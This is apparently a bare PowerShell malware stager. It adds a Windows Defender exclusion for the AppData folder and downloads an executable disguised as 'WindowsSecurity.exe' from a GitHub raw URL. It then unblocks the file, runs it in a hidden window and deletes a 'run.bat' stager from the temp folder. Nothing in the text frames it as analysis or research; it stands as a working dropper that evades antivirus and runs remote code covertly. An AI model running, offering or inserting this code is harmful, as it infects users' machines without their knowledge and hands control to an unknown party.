$dir = $env:AppData
$file = "$dir\WindowsSecurity.exe"
$url = "https://github.com/zrxqzrxq123/asdasd/raw/refs/heads/main/WindowsSecurity.exe"

# 1. Add Exclusion for the folder
Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

# 2. Wait for exclusion to sync
Start-Sleep -s 2

# 3. Download the EXE
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $file)

# 4. Unblock and Run Hidden
Unblock-File $file
Start-Process $file -WindowStyle Hidden

# 5. Cleanup stagers (Optional)
Remove-Item "$env:TEMP\run.bat" -Force -ErrorAction SilentlyContinue